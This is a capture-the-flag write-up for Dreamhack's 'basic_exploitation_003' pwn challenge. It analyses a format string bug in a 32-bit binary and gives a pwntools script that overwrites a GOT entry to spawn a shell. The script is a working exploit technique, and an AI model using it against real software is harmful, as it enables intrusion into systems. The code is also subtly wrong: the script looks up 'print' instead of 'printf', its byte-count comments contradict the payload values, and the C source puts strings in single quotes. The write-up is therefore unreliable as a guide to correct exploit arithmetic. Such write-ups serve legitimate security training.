# basic_exploitation_003 - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: basic_exploitation_003.c, basic_exploitation_003(ELF)
- tools:
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec basic_exploitation_003
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts('TIME OUT');
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system('/bin/sh');
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf('ECHO : %s\n', stack_buf);
    return 0;
}
```
## Vulnerability
### FSB(Format String Bug)
``` c
sprintf(stack_buf, heap_buf);
```
복사할 때, FSB 취약점이 발생한다.  
## Exploit
### Strategy
공격 방법은 2가지로 다음과 같다.  
1. `ra`를 `get_shell` 주소로 변경
2. `printf_got`를 `get_shell` 주소로 변경

두 번째 방법으로 공격을 사용할 것이다. 
### Exploitation Steps
``` sh
$ ./basic_exploitation_003
AAAA AAAA %x %x %x %x %x %x %x %x %x %x
ECHO : AAAA AAAA 41414141 41414120 31342041 31343134 34203134 34313431 20303231 34333133 31343032 33313320
```
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
| ra | 0x4 |
| ebp |  |
| heap_buf | -0x8 |
| stack_buf | -0x98 |
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 20953) 
context.arch = 'i386'

e = ELF('./basic_exploitation_003')

# payload
print_got = e.got['print'] # 0x0804a010 
payload = b''
payload += p32(print_got + 0) # 0x0804a010 -> size: 4byte 
payload += p32(print_got + 1) # 0x0804a011 -> size: 4byte 

get_shell = e.symbols['get_shell'] # 0x08048669, 0x86 = 134, 0x69 = 105
payload += b'%97c%1$hhn' # address: 0x0804a010 -> value: 8(payload 앞 부분 8byte) + 97 = 105 = 0x69
payload += b'%29c%2$hhn' # address: 0x0804a011 -> value: 105 + 27 = 134 = 0x84
p.sendline(payload)

# print(repr(payload))
p.interactive()
```